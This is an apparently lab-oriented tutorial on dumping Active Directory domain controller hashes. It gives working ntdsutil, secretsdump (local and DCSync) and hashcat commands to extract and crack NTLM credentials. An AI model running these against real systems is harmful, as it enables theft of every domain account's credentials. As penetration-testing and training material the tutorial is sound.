# Dumping Domain Controller Hashes: Local and Remote Methods

This guide covers the steps to dump Domain Controller hashes both locally and remotely.

---

## NTDS Domain Controller

**New Technologies Directory Services (NTDS)** is a database containing all Active Directory data, including objects, attributes, and credentials. The `NTDS.dit` data consists of three tables:

- **Schema table:** Contains types of objects and their relationships.
- **Link table:** Contains object attributes and their values.
- **Data table:** Contains users and groups.

By default, NTDS is located at `C:\Windows\NTDS` and is encrypted to prevent unauthorized extraction. The file is locked while Active Directory is running, but there are ways to obtain a copy. This guide discusses using `ntdsutil` and `Diskshadow` to copy the NTDS file and how to dump its contents. Decrypting NTDS requires the system Boot Key (stored in the `SECURITY` file), so you must also dump this file.

---

## Ntdsutil

`ntdsutil` is a Windows utility for managing and maintaining Active Directory configurations. It can be used to:

- Restore deleted objects in Active Directory
- Perform AD database maintenance
- Manage Active Directory snapshots
- Set Directory Services Restore Mode (DSRM) administrator passwords

[Microsoft documentation on ntdsutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/ntdsutil)

---

## Local Dumping (No Credentials)

If you have administrator access to the domain controller (but no credentials), you can use Windows utilities to dump the NTDS file and crack it offline.

**Required files:**

- `C:\Windows\NTDS\ntds.dit`
- `C:\Windows\System32\config\SYSTEM`
- `C:\Windows\System32\config\SECURITY`

**PowerShell one-liner to dump NTDS using ntdsutil:**

```powershell
ntdsutil.exe "ac i ntds" "ifm" "create full c:\temp" q q
```

After running the command, check `C:\temp` for two folders: `Active Directory` and `registry`, which contain the required files. Transfer them to your attack machine and use `secretsdump.py` to extract hashes:

```bash
python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

---

## Remote Dumping (With Credentials)

To dump hashes remotely, you need credentials for a user with administrative access or special permissions (see DC Sync section).

### DC Sync Attack

The **DC Sync** attack allows an attacker with the following AD permissions to replicate domain credentials:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

This attack can be performed using tools like Mimikatz or Impacket's `secretsdump.py`.

**Example command:**

```bash
python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP
```

- `-just-dc`: Extracts NTDS data.
- `THM.red/<AD_Admin_User>`: Authenticated domain user (`domain/user`).

**To dump only NTLM hashes:**

```bash
python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP
```

---

## Cracking the Hashes

Once hashes are obtained, you can use them for impersonation or crack them with tools like Hashcat:

```bash
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
```
- `-m 1000`: Windows NTLM hash mode

---